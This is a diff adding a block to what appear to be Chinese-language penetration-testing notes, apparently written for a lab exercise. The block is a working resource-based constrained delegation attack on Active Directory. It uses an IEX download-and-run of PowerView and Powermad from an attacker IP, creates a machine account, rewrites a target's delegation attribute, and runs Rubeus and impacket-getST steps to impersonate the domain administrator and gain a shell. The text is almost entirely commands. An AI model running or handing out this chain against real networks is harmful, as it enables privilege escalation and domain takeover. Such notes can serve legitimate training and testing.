@@ -40,3 +40,28 @@ impacket-smbexec -no-pass -k file01.evil.com
 
 那么我们就用我们的中间人去申请目标的本地管理员
 
+```
+IEX(new-object system.net.webclient).downloadstring('http://192.168.49.151/powerview.ps1')
+IEX(new-object system.net.webclient).downloadstring('http://192.168.49.151/powermad.ps1')
+New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force) -verbose
+
+Get-DomainComputer -Identity myComputer
+$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes,0)
+Get-DomainComputer -Identity <replacetarget> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+接下来是确定已经改好了
+$RBCDbytes = Get-DomainComputer $targetcomputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+$Descriptor.DiscretionaryAcl.SecurityIdentifier.Value | ConvertFrom-SID
+
+拿shell
+.\Rubeus.exe hash /password:h4x  记住rc4_hmac
+.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/jump09.ops.comply.com /ptt
+然后尝试访问共享
+如果可以的话 要么用windows的scshell.exe 或者 getsT.py
+impacket-getST -spn CIFS/jump09.ops.comply.com -impersonate 'administrator' -ts ops.comply.com/myComputer\$:'h4x' -dc-ip 172.16.151.165
+```
+
